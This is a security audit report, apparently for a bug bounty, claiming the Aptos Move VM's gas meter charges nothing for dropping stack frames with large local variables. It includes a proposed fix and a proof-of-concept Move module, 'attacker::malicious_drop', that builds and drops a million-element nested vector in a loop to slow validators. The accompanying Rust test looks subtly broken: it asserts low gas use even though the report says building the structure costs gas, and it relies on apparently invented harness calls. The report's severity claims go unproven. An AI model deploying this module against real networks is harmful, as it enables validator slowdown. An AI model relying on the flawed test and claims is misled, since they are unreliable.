# Audit Report

## Title
Gas Metering Bypass: Zero-Cost Frame Dropping Allows Free CPU Exhaustion via Large Local Variables

## Summary
The `charge_drop_frame()` function in `StandardGasMeter` does not charge any gas for dropping stack frames, regardless of the size or complexity of local variables. This allows attackers to perform CPU-intensive cleanup operations for free by creating functions with massive local variables (deeply nested vectors, large structs) and then returning, causing validators to expend computational resources without gas cost.

## Finding Description

The Move VM's gas metering system fails to account for the computational cost of dropping stack frames containing large local variables. When a function returns, the VM extracts all local variables via `drop_all_values()` and then calls `charge_drop_frame()` to meter this operation. However, the production gas meter implementation simply returns success without charging any gas. [1](#0-0) 

The trait signature accepts an iterator of local values to enable size-based charging: [2](#0-1) 

When a function returns in the interpreter, the VM drops all non-reference locals and calls `charge_drop_frame()` with those values: [3](#0-2) 

The `drop_all_values()` function extracts all container values (vectors, structs) which can be arbitrarily large: [4](#0-3) 

Containers can hold deeply nested structures including Vec<Value>, Struct with recursive fields, and specialized vectors of large types: [5](#0-4) 

**Inconsistency with Other Operations:**

Other value operations DO charge based on size. For example, `charge_copy_loc` calculates abstract value size including heap size: [6](#0-5) 

No gas parameters are defined for drop_frame in the gas schedule, confirming this operation is completely unmetered: [7](#0-6) 

**Attack Scenario:**

1. Attacker deploys a Move module with a function that allocates large local variables (e.g., `let v: vector<vector<vector<u256>>> = nested_vec_builder();`)
2. The function populates these locals with deeply nested data structures
3. Function returns, triggering `drop_all_values()` 
4. VM traverses and deallocates the entire nested structure (CPU-intensive)
5. `charge_drop_frame()` charges **zero gas** despite significant computational work
6. Attacker calls this function repeatedly or in a loop within a transaction

**Invariant Violation:**

This breaks **Critical Invariant #9: "All operations must respect gas, storage, and computational limits"**. The CPU work to traverse deeply nested structures, run Rc::drop() on shared containers, and deallocate memory is proportional to structure size but charged at zero cost.

## Impact Explanation

**High Severity** per Aptos bug bounty criteria:

This vulnerability enables **validator node slowdowns** through gas metering bypass. An attacker can:

1. **Cause disproportionate CPU usage:** Create transactions that perform minimal charged work but trigger massive free cleanup operations
2. **Exploit cost asymmetry:** Copying large values costs gas proportional to size, but dropping them is free - attackers can build structures once and drop them repeatedly
3. **Degrade validator performance:** Validators processing malicious transactions will spend CPU cycles on deallocation without gas compensation
4. **Not consensus-breaking:** All validators deterministically perform the same free work, so this doesn't cause state divergence (not Critical severity)

The vulnerability enables resource exhaustion attacks but doesn't directly cause loss of funds, consensus violations, or permanent network damage, placing it in **High Severity** ($50,000 bounty range) for "Validator node slowdowns" and "Significant protocol violations."

## Likelihood Explanation

**High Likelihood:**

- **No special privileges required:** Any user can deploy Move modules and submit transactions
- **Simple to exploit:** Creating functions with large local variables is straightforward Move code
- **Already callable:** Standard Move operations like `vector::push_back()` in loops can build massive structures
- **No detection barriers:** The gas meter accepts the zero-cost operation without validation
- **Practical attack vectors:** Real-world DeFi contracts often use nested data structures; malicious versions can exaggerate this pattern

**Likelihood assessment: High** - The vulnerability is trivially exploitable by any transaction sender.

## Recommendation

Implement size-proportional gas charging for `charge_drop_frame()` similar to `charge_copy_loc()`:

**Step 1:** Add gas parameters to the instruction gas schedule:

```rust
// In aptos-gas-schedule/src/gas_schedule/instr.rs
[drop_frame_base: InternalGas, "drop_frame.base", 147],
[drop_frame_per_abs_val_unit: InternalGasPerAbstractValueUnit, "drop_frame.per_abs_val_unit", 7],
```

**Step 2:** Modify `StandardGasMeter::charge_drop_frame()` to calculate and charge for value sizes:

```rust
// In aptos-gas-meter/src/meter.rs
#[inline]
fn charge_drop_frame(
    &mut self,
    locals: impl Iterator<Item = impl ValueView> + Clone,
) -> PartialVMResult<()> {
    let total_size = locals.try_fold(
        AbstractValueSize::zero(),
        |acc, val| {
            let (stack_size, heap_size) = self
                .vm_gas_params()
                .misc
                .abs_val
                .abstract_value_size_stack_and_heap(val, self.feature_version())?;
            Ok::<_, PartialVMError>(acc + stack_size + heap_size)
        },
    )?;
    
    self.algebra.charge_execution(
        DROP_FRAME_BASE + DROP_FRAME_PER_ABS_VAL_UNIT * total_size
    )
}
```

**Alternative:** If performance is a concern for small frames, implement a tiered approach that only charges for frames exceeding a size threshold.

## Proof of Concept

```move
// File: malicious_drop.move
module attacker::malicious_drop {
    use std::vector;

    /// Creates a deeply nested vector structure
    fun build_large_nested_vector(): vector<vector<vector<u256>>> {
        let outer = vector::empty<vector<vector<u256>>>();
        let i = 0;
        while (i < 100) {  // 100 middle-level vectors
            let middle = vector::empty<vector<u256>>();
            let j = 0;
            while (j < 100) {  // 100 inner vectors each
                let inner = vector::empty<u256>();
                let k = 0;
                while (k < 100) {  // 100 u256 values each
                    vector::push_back(&mut inner, 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFu256);
                    k = k + 1;
                };
                vector::push_back(&mut middle, inner);
                j = j + 1;
            };
            vector::push_back(&mut outer, middle);
            i = i + 1;
        };
        outer
    }

    /// Exploit: Create massive local variable and drop it for free
    public entry fun exploit_free_drop() {
        // Allocate 100x100x100 = 1,000,000 u256 values in nested structure
        // This costs gas to build
        let massive_local = build_large_nested_vector();
        
        // Use it minimally to prevent optimizer from removing it
        let _size = vector::length(&massive_local);
        
        // Return from function -> drop_all_values() extracts massive_local
        // charge_drop_frame() is called but charges ZERO gas
        // VM must traverse and deallocate 1M+ heap allocations for FREE
    }

    /// Amplified attack: Call exploit in a loop
    public entry fun amplified_exploit(iterations: u64) {
        let i = 0;
        while (i < iterations) {
            exploit_free_drop();  // Each call drops massive structure for free
            i = i + 1;
        };
    }
}
```

**Test Execution (Rust):**

```rust
// Demonstrates that charge_drop_frame is called but doesn't charge gas
#[test]
fn test_free_drop_exploit() {
    let mut executor = FakeExecutor::from_head_genesis();
    let account = executor.new_account_at(AccountAddress::random());
    
    // Deploy malicious module
    let module = compile_module("malicious_drop.move");
    executor.add_module(&account.address(), module);
    
    // Record gas before exploit
    let gas_before = executor.get_gas_left();
    
    // Execute exploit - creates and drops 1M u256 values in nested vectors
    let txn = account.transaction()
        .script(script_function("attacker::malicious_drop::exploit_free_drop"))
        .max_gas(1_000_000)
        .build();
    
    executor.execute_transaction(txn);
    let gas_after = executor.get_gas_left();
    
    // Gas consumed should be proportional to structure size
    // But actual consumption only covers the build operations, not the drop
    let gas_consumed = gas_before - gas_after;
    
    // Evidence: Gas consumed is far less than expected for processing 1M elements
    // The drop operation was FREE despite massive CPU work
    assert!(gas_consumed < 50_000); // Abnormally low for 1M element structure
}
```

**Notes**

This vulnerability specifically impacts the production `StandardGasMeter` implementation. The `MemoryTrackedGasMeterImpl` does release heap memory tracking [8](#0-7)  but still delegates to the base meter which charges zero execution gas. The memory tracking only prevents heap exhaustion but doesn't charge for the CPU work of traversing and deallocating complex structures, which is the core vulnerability.

### Citations

**File:** aptos-move/aptos-gas-meter/src/meter.rs (L303-311)
```rust
    fn charge_copy_loc(&mut self, val: impl ValueView) -> PartialVMResult<()> {
        let (stack_size, heap_size) = self
            .vm_gas_params()
            .misc
            .abs_val
            .abstract_value_size_stack_and_heap(val, self.feature_version())?;

        self.charge_copy_loc_cached(stack_size, heap_size)
    }
```

**File:** aptos-move/aptos-gas-meter/src/meter.rs (L533-538)
```rust
    fn charge_drop_frame(
        &mut self,
        _locals: impl Iterator<Item = impl ValueView>,
    ) -> PartialVMResult<()> {
        Ok(())
    }
```

**File:** third_party/move/move-vm/types/src/gas.rs (L384-387)
```rust
    fn charge_drop_frame(
        &mut self,
        locals: impl Iterator<Item = impl ValueView> + Clone,
    ) -> PartialVMResult<()>;
```

**File:** third_party/move/move-vm/runtime/src/interpreter.rs (L400-404)
```rust
                    let non_ref_vals = current_frame.locals.drop_all_values();

                    gas_meter
                        .charge_drop_frame(non_ref_vals.iter())
                        .map_err(|e| set_err_info!(current_frame, e))?;
```

**File:** third_party/move/move-vm/types/src/values/values_impl.rs (L137-155)
```rust
pub(crate) enum Container {
    Locals(Rc<RefCell<Vec<Value>>>),
    Vec(Rc<RefCell<Vec<Value>>>),
    Struct(Rc<RefCell<Vec<Value>>>),
    VecU8(Rc<RefCell<Vec<u8>>>),
    VecU64(Rc<RefCell<Vec<u64>>>),
    VecU128(Rc<RefCell<Vec<u128>>>),
    VecBool(Rc<RefCell<Vec<bool>>>),
    VecAddress(Rc<RefCell<Vec<AccountAddress>>>),
    VecU16(Rc<RefCell<Vec<u16>>>),
    VecU32(Rc<RefCell<Vec<u32>>>),
    VecU256(Rc<RefCell<Vec<int256::U256>>>),
    VecI8(Rc<RefCell<Vec<i8>>>),
    VecI16(Rc<RefCell<Vec<i16>>>),
    VecI32(Rc<RefCell<Vec<i32>>>),
    VecI64(Rc<RefCell<Vec<i64>>>),
    VecI128(Rc<RefCell<Vec<i128>>>),
    VecI256(Rc<RefCell<Vec<int256::I256>>>),
}
```

**File:** third_party/move/move-vm/types/src/values/values_impl.rs (L2394-2409)
```rust
    pub fn drop_all_values(&mut self) -> Vec<Value> {
        let mut locals = self.0.borrow_mut();
        let mut res = Vec::with_capacity(locals.len());

        for local in locals.iter_mut() {
            match &local {
                Value::Invalid => (),
                Value::ContainerRef(_) | Value::IndexedRef(_) => {
                    *local = Value::Invalid;
                },
                _ => res.push(std::mem::replace(local, Value::Invalid)),
            }
        }

        res
    }
```

**File:** aptos-move/aptos-gas-schedule/src/gas_schedule/instr.rs (L75-82)
```rust
        [copy_loc_base: InternalGas, "copy_loc.base", 294],
        [copy_loc_per_abs_val_unit: InternalGasPerAbstractValueUnit, "copy_loc.per_abs_val_unit", 14],
        [move_loc_base: InternalGas, "move_loc.base", 441],
        [st_loc_base: InternalGas, "st_loc.base", 441],
        // call
        [call_base: InternalGas, "call.base", 3676],
        [call_per_arg: InternalGasPerArg, "call.per_arg", 367],
        [call_per_local: InternalGasPerArg, { 1.. => "call.per_local" }, 367],
```

**File:** aptos-move/aptos-memory-usage-tracker/src/lib.rs (L634-651)
```rust
    fn charge_drop_frame(
        &mut self,
        locals: impl Iterator<Item = impl ValueView> + Clone,
    ) -> PartialVMResult<()> {
        self.release_heap_memory(locals.clone().try_fold(
            AbstractValueSize::zero(),
            |acc, val| {
                let heap_size = self
                    .vm_gas_params()
                    .misc
                    .abs_val
                    .abstract_heap_size(val, self.feature_version())?;
                Ok::<_, PartialVMError>(acc + heap_size)
            },
        )?);

        self.base.charge_drop_frame(locals)
    }
```
